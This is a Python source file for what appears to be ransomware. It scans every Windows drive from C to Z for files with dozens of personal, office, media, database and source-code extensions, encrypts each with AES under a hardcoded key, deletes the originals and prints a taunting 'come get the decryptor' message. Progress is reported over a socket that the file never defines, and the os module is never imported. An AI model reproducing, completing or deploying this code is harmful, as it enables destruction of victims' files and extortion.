
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import random
import sys
import pkg_resources



sysFiles = [] # all of the files found on the machine.


# Encryts a file with a key

def encrypt(key, filename):
    chunksize = 64 * 1024
    #Encrypt every file with .ext "!Bricked
    outFile = os.path.join(os.path.dirname(filename), "!Bricked" + os.path.basename(filename))
    
    filesize = str(os.path.getsize(filename)).zfill(16)
    
    # Initiialization vector.
    IV = ''

    for i in range(16):
        IV += chr(random.randint(0, 0xFF))

    encryption = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, "rb") as infile:
        with open(outFile, "wb") as outfile:
            outfile.write(filesize)
            outfile.write(IV)
            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break

                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - (len(chunk) % 16))
                outfile.write(encryption.encrypt(chunk))


def brickSystem(key):
    
    KEY = key
   
    discoverFiles() # Find all files
    
    ALL_FILES = sysFiles 

    for target_file in ALL_FILES:
        if os.path.basename(target_file).startswith("!Bricked"):
            pass
        elif target_file == os.path.join(os.getcwd(), sys.argv[0]):
            pass
        else:
            C_socket.send("Encrypting "+str(target_file))
            encrypt(SHA256.new(KEY).digest(), str(target_file))
            os.remove(target_file)
                

# Search every drive on the victims computer. Appending the file to the sysFile total list.

# Replace getcwd with '/root' for linux machines, or traverse all drives for windows machines.

def discoverFiles():
    
    Search_C_Drive()
    Search_D_Drive()
    Search_E_Drive()
    Search_F_Drive()
    Search_G_Drive()
    Search_H_Drive()
    Search_I_Drive()
    Search_J_Drive()
    Search_K_Drive()
    Search_L_Drive()
    Search_M_Drive()
    Search_N_Drive()
    Search_O_Drive()
    Search_P_Drive()
    Search_Q_Drive()
    Search_R_Drive()
    Search_S_Drive()
    Search_T_Drive()
    Search_U_Drive()
    Search_V_Drive()
    Search_W_Drive()
    Search_X_Drive()
    Search_Y_Drive()
    Search_Z_Drive()
        

extensions = [
        # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES ~ ! LETHAL TO ENCRYPT !
        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # IMAGES
        'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # AUDIO
        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # VIDEOS 

        'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office
        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OFFICE FILES
        'yml', 'yaml', 'json', 'xml', 'csv', # STRUCT DATA
        'db', 'sql', 'dbf', 'mdb', 'iso', # DATABASES | DISC IMAGES

        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # WEB
        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C-SOURCE
        'java', 'class', 'jar', # JAVA
        'ps', 'bat', 'vb', # WINDOW SCRIPTS
        'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # LINUX / MAC
        'go', 'py', 'pyc', 'bf', 'coffee', # OTHER 

        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # COMPRESSED FILES
]


# Search functions for all drives
# Check if the file is a wanted extension
def Search_C_Drive():
    for dirpath, dirs, files in os.walk("C:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)


def Search_D_Drive():
    for dirpath, dirs, files in os.walk("D:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_E_Drive():
    for dirpath, dirs, files in os.walk("E:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_F_Drive():
    for dirpath, dirs, files in os.walk("F:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_G_Drive():
    for dirpath, dirs, files in os.walk("G:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_H_Drive():
    for dirpath, dirs, files in os.walk("H:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_I_Drive():
    for dirpath, dirs, files in os.walk("I:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_J_Drive():
    for dirpath, dirs, files in os.walk("J:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_K_Drive():
    for dirpath, dirs, files in os.walk("K:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_L_Drive():
    for dirpath, dirs, files in os.walk("L:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_M_Drive():
    for dirpath, dirs, files in os.walk("M:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_N_Drive():
    for dirpath, dirs, files in os.walk("N:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_O_Drive():
    for dirpath, dirs, files in os.walk("O:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_P_Drive():
    for dirpath, dirs, files in os.walk("P:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_Q_Drive():
    for dirpath, dirs, files in os.walk("Q:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_R_Drive():
    for dirpath, dirs, files in os.walk("R:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_S_Drive():
    for dirpath, dirs, files in os.walk("S:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_T_Drive():
    for dirpath, dirs, files in os.walk("T:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_U_Drive():
    for dirpath, dirs, files in os.walk("U:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_V_Drive():
    for dirpath, dirs, files in os.walk("V:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_W_Drive():
    for dirpath, dirs, files in os.walk("W:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_X_Drive():
    for dirpath, dirs, files in os.walk("X:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_Y_Drive():
    for dirpath, dirs, files in os.walk("Y:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)

def Search_Z_Drive():
    for dirpath, dirs, files in os.walk("Z:\\"):
        for filename in files:
           
            fname = os.path.join(dirpath,filename)
          
            if fname.endswith(tuple(extensions)):
                sysFiles.append(fname)



def main():
    user_key = "EXAMPLE KEY :)" 
    brickSystem(user_key)
    print("Unlucky, your files have been compromised")
    print(" Just kidding come get the decryptor " )
    


